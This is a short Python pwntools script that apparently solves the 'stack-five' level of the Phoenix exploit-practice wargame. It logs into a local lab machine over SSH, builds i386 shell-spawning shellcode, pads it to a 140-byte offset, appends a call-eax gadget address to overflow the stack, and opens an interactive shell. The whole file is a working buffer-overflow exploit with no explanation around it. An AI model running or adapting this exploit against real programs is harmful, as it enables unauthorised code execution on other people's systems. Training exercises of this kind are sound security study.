from pwn import *
import warnings
warnings.filterwarnings("ignore")


challenge_name = "stack-five"

#pattern = cyclic(512)
#offset = cyclic_find(0x61616175) # ie. 80

shell_code = asm(shellcraft.i386.sh())
ropGadget_calleax = 0x08048350
payload = shell_code + 'A' * (140 - len(shell_code)) + pack(ropGadget_calleax, word_size=32)

shell = ssh('user','localhost',port=2222,password='user')
conn = shell.process('/opt/phoenix/i486/{}'.format(challenge_name))

conn.sendline(payload)
conn.interactive()
conn.close()

